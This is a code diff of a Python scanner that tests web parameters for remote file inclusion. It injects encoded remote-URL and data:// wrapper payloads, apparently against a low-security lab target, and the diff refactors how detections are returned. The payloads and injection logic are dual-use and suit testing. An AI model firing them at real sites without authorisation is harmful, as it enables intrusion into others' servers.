@@ -6,6 +6,20 @@ import requests
 from urllib import parse
 from urllib.parse import urlparse
 
+def make_GET_form(url):
+    dic={}
+    dic['vuln']='RFI'
+    dic['method']='GET'
+    dic['url']=url
+    return dic
+
+def make_POST_form(url,data):
+    dic={}
+    dic['vuln']='RFI'
+    dic['method']='POST'
+    dic['url']=url
+    dic['data']=data
+    return dic
 
 def complete_url(input_url):
     if not input_url.startswith("http"):
@@ -23,23 +37,18 @@ def scan_rfi_GET(url):
                   ['hTtp:%252f%252ftests.arachni-scanner.com%252frfi.md5.txt','double encoding'],
                   ["data://text/plain;base64,NzA1Y2Q1NTliMTZlNjk0NjgyNjIwN2MyMTk5YmQ4OTA=",'Wrapper']
                   ]
-    result_list=[]
     for exploit in exploit_list:
         if "=" in url:
             split_url = url.split("=")[0]
             scan_addr = split_url + "=" + exploit[0]
             print(scan_addr)
-            cookies = {'PHPSESSID': '58e0jmvoido7h1g622qt6ls782', 'security': 'low'}
+            cookies = {'PHPSESSID': 'ulhd1o6b1jbpopi1e4okrc0gn7', 'security': 'low'}
             res_rfi = requests.get(scan_addr,cookies=cookies,verify=False)
             requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
             if res_rfi.status_code == 200 and rfi_txt in res_rfi.text:
-                result_list.append(exploit)
-    if len(result_list)==0:
-        print("RFI_GET NOT DETECTED")
-        return False
-    else:
-        print(result_list)
-        return True
+                return make_GET_form(scan_addr)
+    print("RFI_GET NOT DETECTED")
+    return False
 
 def scan_rfi_multi_GET(url):
     rfi_txt="705cd559b16e6946826207c2199bd890"
@@ -55,13 +64,9 @@ def scan_rfi_multi_GET(url):
             res_rfi = requests.get(scan_addr,verify=False)
             requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
             if res_rfi.status_code == 200 and rfi_txt in res_rfi.text:
-                result_list.append(exploit)
-    if len(result_list)==0:
-        print("RFI_GET NOT DETECTED")
-        return False
-    else:
-        print(result_list)
-        return True
+                return scan_addr
+    print("RFI_GET NOT DETECTED")
+    return False
 
 def scan_rfi_post(url,form):
     print(url)
@@ -80,15 +85,11 @@ def scan_rfi_post(url,form):
                     val = exploit
                     data = {key : val}
                     res = requests.post(url, data = data,verify=False)
-                    print(res.text)
                     if res.status_code == 200 and rfi_txt in res.text:
-                        result_list.append(exploit)
-    if len(result_list) == 0:
-        print("RFI_POST NOT DETECTED")
-        return False
-    else:
-        print(result_list)
-        return True
+                        print(exploit)
+                        return
+    print("RFI_GET NOT DETECTED")
+    return False
 
 
 def rfi_attack(url):
@@ -108,9 +109,12 @@ def rfi_attack(url):
         for z in range(len(keys)):
             #(ex)url = url_path + key0 + "=" + () + & + key1 + "=" + () + & + key2 + "=" + ()
             new_url = url.replace(values[z],"#RFI#")
-            scan_rfi_multi_GET(new_url)
+            result = scan_rfi_multi_GET(new_url)
+            if(result!=False):
+                return result
     else:
-        scan_rfi_GET(url)
+        result = scan_rfi_GET(url)
+    return result
         
     
     
